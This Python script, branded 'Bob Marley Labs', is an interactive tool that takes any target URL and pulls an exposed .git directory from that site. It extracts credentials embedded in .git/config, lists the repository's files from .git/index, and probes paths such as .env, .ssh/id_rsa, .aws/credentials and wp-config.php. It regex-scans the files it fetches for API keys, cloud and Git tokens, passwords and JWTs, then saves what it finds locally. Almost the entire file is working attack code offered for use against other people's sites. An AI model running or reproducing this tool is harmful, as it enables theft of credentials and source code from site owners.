#!/usr/bin/env python3
"""
Git Repository Dumper & Explorer
BOB MARLEY LABS - Interactive Git Source Code Browser
"""
import requests
import os
import sys
import zlib
import re
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    C = "\033[96m"
    W = "\033[97m"
    RST = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

# Storage
repo_files = []
current_file = None
current_content = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""{C.C}{C.BOLD}
     ██████╗ ██╗████████╗    ██████╗ ██╗   ██╗███╗   ███╗██████╗ ███████╗██████╗ 
    ██╔════╝ ██║╚══██╔══╝    ██╔══██╗██║   ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗
    ██║  ███╗██║   ██║       ██║  ██║██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
    ██║   ██║██║   ██║       ██║  ██║██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗
    ╚██████╔╝██║   ██║       ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║
     ╚═════╝ ╚═╝   ╚═╝       ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{C.RST}
            {C.Y}{C.BOLD}INTERACTIVE GIT REPOSITORY BROWSER{C.RST}
            {C.M}Bob Marley Labs | VENI VIDI VICI{C.RST}
"""
    print(banner)

def fetch_git_file(base_url, path):
    """Fetch a file from exposed .git directory"""
    url = f"{base_url}/.git/{path}"
    try:
        resp = requests.get(url, timeout=15, verify=False)
        if resp.status_code == 200:
            return resp.content
        return None
    except:
        return None

def parse_git_config(base_url):
    """Parse .git/config file"""
    print(f"\n{C.Y}[*] Fetching .git/config...{C.RST}")
    
    config_data = fetch_git_file(base_url, "config")
    if not config_data:
        print(f"{C.R}[!] Cannot access .git/config{C.RST}")
        return None
    
    config_text = config_data.decode('utf-8', errors='ignore')
    print(f"{C.G}[+] .git/config found!{C.RST}\n")
    
    # Parse config
    info = {
        'remote_url': None,
        'username': None,
        'email': None,
        'credentials': []
    }
    
    # Extract remote URL
    remote_match = re.search(r'url\s*=\s*(.+)', config_text)
    if remote_match:
        info['remote_url'] = remote_match.group(1).strip()
        print(f"{C.C}[REMOTE]{C.RST} {info['remote_url']}")
        
        # Check for credentials in URL
        if '@' in info['remote_url']:
            cred_match = re.search(r'//([^:]+):([^@]+)@', info['remote_url'])
            if cred_match:
                info['credentials'].append({
                    'username': cred_match.group(1),
                    'password': cred_match.group(2)
                })
                print(f"{C.R}[!!!CREDENTIALS FOUND!!!]{C.RST}")
                print(f"  Username: {cred_match.group(1)}")
                print(f"  Password: {cred_match.group(2)}")
    
    # Extract user info
    user_match = re.search(r'name\s*=\s*(.+)', config_text)
    if user_match:
        info['username'] = user_match.group(1).strip()
        print(f"{C.B}[USER]{C.RST} {info['username']}")
    
    email_match = re.search(r'email\s*=\s*(.+)', config_text)
    if email_match:
        info['email'] = email_match.group(1).strip()
        print(f"{C.B}[EMAIL]{C.RST} {info['email']}")
    
    print()
    return info

def parse_git_index(base_url):
    """Parse .git/index to get file list"""
    print(f"{C.Y}[*] Fetching .git/index...{C.RST}")
    
    index_data = fetch_git_file(base_url, "index")
    if not index_data:
        print(f"{C.R}[!] Cannot access .git/index{C.RST}")
        return []
    
    # Verify Git index signature
    if len(index_data) < 12 or index_data[:4] != b'DIRC':
        print(f"{C.R}[!] Invalid Git index file (missing DIRC signature){C.RST}")
        return []
    
    print(f"{C.G}[+] .git/index found! Parsing file list...{C.RST}\n")
    
    files = []
    
    try:
        # Git index v2/v3 format
        # Header: DIRC (4 bytes) + version (4 bytes) + entry count (4 bytes)
        import struct
        
        version = struct.unpack('>I', index_data[4:8])[0]
        entry_count = struct.unpack('>I', index_data[8:12])[0]
        
        if version not in [2, 3, 4]:
            print(f"{C.Y}[~] Unsupported index version: {version}{C.RST}")
            return []
        
        if entry_count > 10000:  # Sanity check
            print(f"{C.Y}[~] Suspicious entry count: {entry_count} (possible corrupted index){C.RST}")
            return []
        
        offset = 12
        
        for i in range(entry_count):
            if offset + 62 > len(index_data):
                break
            
            # Each entry has a fixed 62-byte header
            # Skip to flags at offset+60 to get name length
            flags = struct.unpack('>H', index_data[offset+60:offset+62])[0]
            name_length = flags & 0xFFF
            
            # File name starts at offset+62
            name_start = offset + 62
            
            if name_length == 0xFFF:
                # Name is null-terminated
                name_end = index_data.find(b'\x00', name_start)
                if name_end == -1:
                    break
                file_name = index_data[name_start:name_end].decode('utf-8', errors='ignore')
            else:
                # Name has fixed length
                name_end = name_start + name_length
                if name_end > len(index_data):
                    break
                file_name = index_data[name_start:name_end].decode('utf-8', errors='ignore')
            
            # Validate file name (basic sanity check)
            if file_name and 1 <= len(file_name) <= 500 and not any(c in file_name for c in ['\x00', '\r', '\n']):
                files.append(file_name)
            
            # Calculate padding to next entry (entries are padded to 8-byte boundary)
            entry_len = 62 + len(file_name.encode('utf-8'))
            padding = (8 - (entry_len % 8)) % 8
            offset = offset + entry_len + padding
        
        print(f"{C.G}[+] Successfully parsed {len(files)} entries from index{C.RST}")
        
    except Exception as e:
        print(f"{C.R}[!] Error parsing index: {str(e)}{C.RST}")
        return []
    
    return files

def download_git_objects(base_url, hostname):
    """Download all Git objects and reconstruct files"""
    print(f"{C.Y}[*] Downloading Git repository...{C.RST}")
    
    # Create output directory
    output_dir = "Results"
    os.makedirs(output_dir, exist_ok=True)
    
    # Download key files
    key_files = ['config', 'HEAD', 'index', 'packed-refs']
    
    for file in key_files:
        data = fetch_git_file(base_url, file)
        if data:
            with open(f"{output_dir}/.git_{hostname}_{file}", 'wb') as f:
                f.write(data)
            print(f"{C.G}[+] Downloaded: {file}{C.RST}")
    
    # Try to download common refs
    refs = ['refs/heads/master', 'refs/heads/main', 'logs/HEAD']
    
    for ref in refs:
        data = fetch_git_file(base_url, ref)
        if data:
            ref_file = ref.replace('/', '_')
            with open(f"{output_dir}/.git_{hostname}_{ref_file}", 'wb') as f:
                f.write(data)
            print(f"{C.G}[+] Downloaded: {ref}{C.RST}")

def view_file_content(base_url, filepath):
    """Try to fetch file content directly"""
    url = f"{base_url}/{filepath}"
    
    try:
        resp = requests.get(url, timeout=10, verify=False)
        if resp.status_code == 200:
            content = resp.text
            
            # Detect if we got HTML error page instead of actual file
            html_indicators = ['<!DOCTYPE', '<html', '<HTML', '<head>', '<body>', '<title>404', '<title>Error']
            if any(indicator in content[:500] for indicator in html_indicators):
                return None
            
            return content
    except:
        pass
    
    return None

def search_secrets(content):
    """Search for secrets in file content"""
    secrets = []
    
    patterns = {
        'API Key': r'api[_-]?key["\'\s:=]+([a-zA-Z0-9_-]{20,})',
        'Secret Key': r'secret[_-]?key["\'\s:=]+([a-zA-Z0-9_-]{20,})',
        'Password': r'password["\'\s:=]+([^\s\'"]{8,})',
        'Database': r'(mysql|postgres|mongodb)://([^\s\'"]+)',
        'AWS Key': r'AKIA[0-9A-Z]{16}',
        'GitLab Token': r'glpat-[a-zA-Z0-9_-]{20,}',
        'GitHub Token': r'gh[pousr]_[a-zA-Z0-9]{36,}',
        'JWT': r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
    }
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                secrets.append({
                    'type': secret_type,
                    'value': match
                })
    
    return secrets

def interactive_menu():
    """Interactive menu"""
    global repo_files, current_file, current_content
    
    print(f"\n{C.BOLD}{'='*70}{C.RST}")
    print(f"{C.G}[1]{C.RST} Download entire repository")
    print(f"{C.G}[2]{C.RST} List files from .git/index")
    print(f"{C.G}[3]{C.RST} View specific file")
    print(f"{C.G}[4]{C.RST} Search for secrets in files")
    print(f"{C.G}[5]{C.RST} Show .git/config details")
    print(f"{C.G}[6]{C.RST} Try common sensitive files")
    print(f"{C.R}[0]{C.RST} Exit")
    print(f"{C.BOLD}{'='*70}{C.RST}")
    
    choice = input(f"{C.Y}[?] Select option: {C.RST}").strip()
    return choice

def try_common_files(base_url):
    """Try to access common sensitive files"""
    print(f"\n{C.Y}[*] Testing common sensitive files...{C.RST}\n")
    
    sensitive_files = [
        '.env',
        'app/etc/env.php',
        'config/database.yml',
        'config/secrets.yml',
        '.aws/credentials',
        '.ssh/id_rsa',
        'composer.json',
        'package.json',
        'docker-compose.yml',
        '.gitlab-ci.yml',
        '.github/workflows/deploy.yml',
        'secrets.json',
        'credentials.json',
        'config.php',
        'wp-config.php'
    ]
    
    found_files = []
    
    for file in sensitive_files:
        content = view_file_content(base_url, file)
        if content:
            print(f"{C.G}[FOUND]{C.RST} {file}")
            
            # Search for secrets
            secrets = search_secrets(content)
            if secrets:
                print(f"{C.R}  [!!!SECRETS FOUND!!!]{C.RST}")
                for secret in secrets[:3]:
                    print(f"    {secret['type']}: {secret['value'][:50]}...")
            
            found_files.append({
                'path': file,
                'content': content,
                'secrets': secrets
            })
            print()
    
    if not found_files:
        print(f"{C.Y}[~] No common files accessible{C.RST}")
    
    return found_files

def main():
    global repo_files, current_file, current_content
    
    print_banner()
    
    # Ask for target URL
    print(f"{C.BOLD}{'='*70}{C.RST}")
    base_url = input(f"{C.Y}[?] Enter target URL (e.g., https://site.com): {C.RST}").strip()
    
    if not base_url:
        print(f"{C.R}[!] No URL provided{C.RST}")
        sys.exit(1)
    
    base_url = base_url.rstrip('/')
    
    # Remove /.git if included
    if base_url.endswith('/.git'):
        base_url = base_url[:-5]
    
    hostname = base_url.replace('https://', '').replace('http://', '').split('/')[0]
    output_dir = "Results"
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"{C.BOLD}{'='*70}{C.RST}\n")
    
    print(f"{C.BOLD}Target: {C.C}{base_url}{C.RST}")
    print(f"{C.BOLD}Output: {C.C}{output_dir}/git_dump_{hostname}.txt{C.RST}\n")
    
    # Step 1: Parse config
    config_info = parse_git_config(base_url)
    
    if not config_info:
        print(f"{C.R}[!] .git directory not accessible{C.RST}")
        sys.exit(1)
    
    # Step 2: Verify if repo is actually exploitable by checking index
    print(f"{C.Y}[*] Verifying repository accessibility...{C.RST}")
    test_index = fetch_git_file(base_url, "index")
    
    repo_exploitable = False
    
    if not test_index or len(test_index) < 12 or test_index[:4] != b'DIRC':
        print(f"{C.R}[!] WARNING: .git/config is exposed but .git/index is NOT accessible{C.RST}")
        print(f"{C.Y}[~] The credentials in .git/config may still be valid, but you cannot dump the repo{C.RST}")
        print(f"{C.Y}[~] This is a FALSE POSITIVE for repository dumping{C.RST}\n")
        print(f"{C.Y}[*] You can still try option 6 (common files) to check for exposed files{C.RST}")
    else:
        # Index exists, but verify we can actually fetch files from it
        print(f"{C.Y}[*] .git/index found, verifying file accessibility...{C.RST}")
        
        # Quick parse to get a few file paths
        try:
            import struct
            entry_count = struct.unpack('>I', test_index[8:12])[0]
            
            if entry_count > 0 and entry_count < 10000:
                # Try to extract first file path
                offset = 12
                files_to_test = []
                
                for i in range(min(5, entry_count)):  # Test first 5 files
                    if offset + 62 > len(test_index):
                        break
                    
                    flags = struct.unpack('>H', test_index[offset+60:offset+62])[0]
                    name_length = flags & 0xFFF
                    name_start = offset + 62
                    
                    if name_length == 0xFFF:
                        name_end = test_index.find(b'\x00', name_start)
                        if name_end == -1:
                            break
                        file_name = test_index[name_start:name_end].decode('utf-8', errors='ignore')
                    else:
                        name_end = name_start + name_length
                        if name_end > len(test_index):
                            break
                        file_name = test_index[name_start:name_end].decode('utf-8', errors='ignore')
                    
                    if file_name and len(file_name) > 0:
                        files_to_test.append(file_name)
                    
                    entry_len = 62 + len(file_name.encode('utf-8'))
                    padding = (8 - (entry_len % 8)) % 8
                    offset = offset + entry_len + padding
                
                # Try to fetch at least one file
                accessible_count = 0
                for test_file in files_to_test:
                    content = view_file_content(base_url, test_file)
                    if content:
                        accessible_count += 1
                
                if accessible_count > 0:
                    print(f"{C.G}[+] Repository is fully accessible and exploitable!{C.RST}")
                    print(f"{C.G}[+] Verified {accessible_count}/{len(files_to_test)} test files are accessible{C.RST}\n")
                    repo_exploitable = True
                else:
                    print(f"{C.R}[!] WARNING: .git/index exists but source files are NOT accessible{C.RST}")
                    print(f"{C.Y}[~] Index lists {entry_count} files, but they cannot be downloaded directly{C.RST}")
                    print(f"{C.Y}[~] This is a PARTIAL exposure - you may need git-dumper to extract via objects{C.RST}")
                    print(f"{C.Y}[~] Credentials in .git/config are still valid{C.RST}\n")
                    print(f"{C.Y}[*] Try option 1 (Download repository) or option 6 (common files){C.RST}")
            else:
                print(f"{C.R}[!] Invalid entry count in .git/index{C.RST}\n")
        except Exception as e:
            print(f"{C.R}[!] Error validating repository: {str(e)}{C.RST}\n")
    
    while True:
        choice = interactive_menu()
        
        if choice == '0':
            print(f"\n{C.Y}[*] Exiting...{C.RST}\n")
            break
        
        elif choice == '1':
            # Download repository
            print(f"\n{C.Y}[*] Starting repository download...{C.RST}\n")
            download_git_objects(base_url, hostname)
            
            print(f"\n{C.G}[+] Files saved to: {output_dir}/.git_{hostname}_*{C.RST}")
            print(f"{C.Y}[*] Use git-dumper for complete extraction:{C.RST}")
            print(f"{C.C}    pip install git-dumper{C.RST}")
            print(f"{C.C}    git-dumper {base_url}/.git Results/git_dump_{hostname}_complete{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '2':
            # List files
            print(f"\n{C.Y}[*] Parsing .git/index...{C.RST}\n")
            repo_files = parse_git_index(base_url)
            
            if repo_files:
                print(f"{C.G}[+] Found {len(repo_files)} files:{C.RST}\n")
                for i, file in enumerate(repo_files[:50], 1):
                    print(f"  {C.C}{i:3d}.{C.RST} {file}")
                
                if len(repo_files) > 50:
                    print(f"\n{C.DIM}  ... and {len(repo_files)-50} more files{C.RST}")
            else:
                print(f"{C.Y}[~] No files found in index{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '3':
            # View specific file
            filepath = input(f"\n{C.Y}[?] Enter file path: {C.RST}").strip()
            
            print(f"\n{C.Y}[*] Fetching {filepath}...{C.RST}\n")
            content = view_file_content(base_url, filepath)
            
            if content:
                print(f"{C.G}[+] File found!{C.RST}\n")
                print(f"{C.BOLD}{'='*70}{C.RST}")
                
                # Show first 100 lines
                lines = content.split('\n')
                for i, line in enumerate(lines[:100], 1):
                    print(f"{C.DIM}{i:4d}|{C.RST} {line}")
                
                if len(lines) > 100:
                    print(f"\n{C.DIM}... {len(lines)-100} more lines (use option 1 to download full file){C.RST}")
                
                print(f"{C.BOLD}{'='*70}{C.RST}")
                
                # Search for secrets
                secrets = search_secrets(content)
                if secrets:
                    print(f"\n{C.R}[!!!SECRETS FOUND!!!]{C.RST}")
                    for secret in secrets:
                        print(f"  {C.Y}{secret['type']}:{C.RST} {secret['value']}")
                
                current_file = filepath
                current_content = content
            else:
                print(f"{C.R}[!] File not accessible{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '4':
            # Search secrets
            if not repo_files:
                print(f"\n{C.Y}[*] First loading file list...{C.RST}\n")
                repo_files = parse_git_index(base_url)
            
            if not repo_files:
                print(f"{C.R}[!] No files found. Try option 6 for common files.{C.RST}")
                input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
                continue
            
            print(f"\n{C.Y}[*] Scanning {len(repo_files[:20])} files for secrets...{C.RST}\n")
            
            all_secrets = []
            
            for file in repo_files[:20]:  # Scan first 20
                content = view_file_content(base_url, file)
                if content:
                    secrets = search_secrets(content)
                    if secrets:
                        print(f"{C.G}[+] {file}{C.RST}")
                        for secret in secrets:
                            print(f"    {C.Y}{secret['type']}:{C.RST} {secret['value'][:50]}...")
                            all_secrets.append({
                                'file': file,
                                **secret
                            })
            
            if all_secrets:
                print(f"\n{C.R}[TOTAL] {len(all_secrets)} secrets found!{C.RST}")
            else:
                print(f"{C.Y}[~] No secrets found in scanned files{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '5':
            # Show config details
            print(f"\n{C.Y}[*] Re-fetching .git/config...{C.RST}\n")
            config_info = parse_git_config(base_url)
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        elif choice == '6':
            # Try common files
            found = try_common_files(base_url)
            
            if found:
                # Save results
                result_file = f"{output_dir}/git_dump_{hostname}.txt"
                
                with open(result_file, 'w', encoding='utf-8') as f:
                    f.write(f"Git Repository Secrets Extraction\n")
                    f.write(f"Target: {base_url}\n")
                    f.write(f"Date: {datetime.now()}\n\n")
                    f.write("="*70 + "\n\n")
                    
                    for item in found:
                        f.write(f"FILE: {item['path']}\n")
                        f.write("-"*70 + "\n")
                        f.write(item['content'][:5000])
                        f.write("\n\n")
                        
                        if item['secrets']:
                            f.write("SECRETS FOUND:\n")
                            for secret in item['secrets']:
                                f.write(f"  {secret['type']}: {secret['value']}\n")
                            f.write("\n")
                        
                        f.write("="*70 + "\n\n")
                
                print(f"\n{C.G}[+] Results saved to: {result_file}{C.RST}")
            
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")
        
        else:
            print(f"{C.R}[!] Invalid option{C.RST}")
            input(f"\n{C.DIM}Press Enter to continue...{C.RST}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C.Y}[*] Interrupted by user{C.RST}\n")
        sys.exit(0)
